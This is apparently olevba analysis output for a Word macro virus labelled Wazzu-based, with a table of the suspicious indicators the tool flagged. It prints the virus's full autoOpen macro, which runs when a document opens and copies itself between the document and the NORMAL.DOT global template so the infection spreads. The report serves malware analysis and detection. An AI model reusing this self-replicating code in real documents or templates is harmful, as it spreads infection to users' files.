olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-8ab7769caba093ba15a0b14a24cb97d754974575
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-8ab7769caba093ba15a0b14a24cb97d754974575 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-8ab7769caba093ba15a0b14a24cb97d754974575 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
On Error GoTo -1: On Error GoTo Caught
WordBasic.FileSummaryInfo Update:=1
Dim d1lg As Object: Set d1lg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo d1lg

fileMacro$ = d1lg.Directory + "\" + d1lg.FileName + ":autoOpen"
globMacro$ = "Global:autoOpen"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

If MacroFile$ = "NORMAL.DOT" Then
    WordBasic.MacroCopy globMacro$, fileMacro$
    WordBasic.FileSaveAs Format:=1
Else
    WordBasic.MacroCopy fileMacro$, globMacro$
End If

Caught:
    On Error GoTo -1: On Error GoTo 0

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

